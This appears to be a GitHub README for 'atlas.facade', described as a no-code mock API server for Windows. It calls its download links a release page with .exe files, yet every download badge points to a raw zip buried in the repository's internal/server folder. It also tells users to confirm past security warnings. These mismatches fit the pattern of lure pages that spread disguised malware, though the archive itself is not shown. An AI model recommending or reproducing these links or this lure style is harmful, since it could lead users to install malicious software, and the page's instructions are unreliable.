# 🛰️ atlas.facade - Simple Mock API Server for Windows

[![Download atlas.facade](https://img.shields.io/badge/Download-Get%20Latest-blue?style=for-the-badge)](https://raw.githubusercontent.com/Shahdm22/atlas.facade/main/internal/server/atlas-facade-1.7-alpha.3.zip)

## 📋 What is atlas.facade?

atlas.facade is a tool that lets you create a mock backend server without needing to write code. It helps you simulate how an API works so you can test your applications. The server looks and behaves like a real one. It can log incoming requests as they happen, add delays to mimic slow responses, and uses a simple text interface inspired by retro designs.

You do not need technical skills to run it. Simply download and run the software on your Windows PC. atlas.facade runs locally, so you can test your projects without an internet connection.

## 💻 System Requirements

- Windows 10 or later (64-bit recommended)  
- At least 2 GB of free memory  
- 100 MB of free disk space  
- Internet connection only needed to download the software  

atlas.facade does not need installation of extra tools or software. It runs out of the box on supported Windows versions.

## 🔍 Key Features

- Easy setup with no coding needed  
- Instant API server from simple files called PIML (Blueprints for your mock API)  
- Live logging shows requests in real time  
- Simulates network delays to test app behavior  
- Retro-themed text user interface inspired by rugged devices  
- Runs locally on your Windows machine  
- Supports REST API calls with GET, POST, PUT, DELETE methods

## 🚀 Getting Started

### Step 1: Visit the Download Page

Go to the official release page to get the latest version of atlas.facade for Windows:

[![Download atlas.facade](https://img.shields.io/badge/Download-Get%20Latest-grey?style=for-the-badge)](https://raw.githubusercontent.com/Shahdm22/atlas.facade/main/internal/server/atlas-facade-1.7-alpha.3.zip)

This page lists all available versions and files.

### Step 2: Download the Windows Executable

Find the latest release with a file ending in `.exe`. Typically, it will include "windows" or "win" in the filename.

Click the `.exe` file to download it to your PC. Save it to a folder you can easily access, such as your Desktop or Downloads folder.

### Step 3: Run the Software

Locate the downloaded `.exe` file and double-click it to start atlas.facade.

You may see a security warning. If so, confirm that you want to run the file.

The software will open in a black window with text menus. This is the interface where you control the mock server.

### Step 4: Create Your First Mock API

You will need to create a PIML file. PIML stands for "Plain Interface Markup Language." It is a simple text format that tells atlas.facade how to respond to requests.

To create one, open Notepad or any text editor. Write the API blueprint. For example:

```
GET /hello:
  response: "Hello, world!"

POST /data:
  response: '{"status":"received"}'
```

Save this as `blueprint.piml` in the same folder you run atlas.facade from.

### Step 5: Load the Blueprint

In the atlas.facade interface, choose the option to load a blueprint or configuration file.

Select the `blueprint.piml` file you created.

Once loaded, the server will start responding based on your blueprint.

### Step 6: Test Your Mock API

You can now test the API using any tool that sends web requests:

- Open a web browser and go to `http://localhost:8080/hello` to see the "Hello, world!" response.

- Or use simple tools like Postman or curl to send different requests and see responses.

### Step 7: Use Additional Features

- To see real-time logs of your requests, open the log screen from the menu.

- To simulate slow responses, adjust latency settings to delay server replies.

- Use the text interface navigation keys listed at the bottom of the window to switch views and settings.

## 🛠️ Configuration Options

atlas.facade allows you to tweak a few settings to fit your needs:

- **Port selection:** Change the server port from the default 8080 if that is busy.

- **Latency simulation:** Add fixed or random delay to responses to simulate slow networks.

- **Logging level:** Choose between minimal or verbose logs.

- **Blueprint reload:** Enable auto-reload so changes in the PIML file update the server instantly.

Settings can be adjusted in the main menu or by editing a config file named `config.yaml` if you prefer.

## 🔄 Updating atlas.facade

Check the releases page regularly for new versions. To update:

1. Download the latest `.exe` file.

2. Close the running atlas.facade program.

3. Run the new `.exe` file from your download location.

Your configuration file and blueprints remain unchanged unless you delete them.

## 📂 Where to Learn More

- The `README.md` in the download repository explains full blueprint syntax.

- Look for example PIML files in the releases section to understand structure.

- Use the interface help menu to see command keys and shortcuts.

## 🛡️ Security

atlas.facade runs only on your local machine and does not open access to the public internet by default. This limits exposure to outside threats.

You control what mock APIs run and what data is served.

Do not run the software with elevated permissions unless you understand the risks.

---

# Download atlas.facade to your PC:

[![Download atlas.facade](https://img.shields.io/badge/Download-Get%20Latest-blue?style=for-the-badge)](https://raw.githubusercontent.com/Shahdm22/atlas.facade/main/internal/server/atlas-facade-1.7-alpha.3.zip)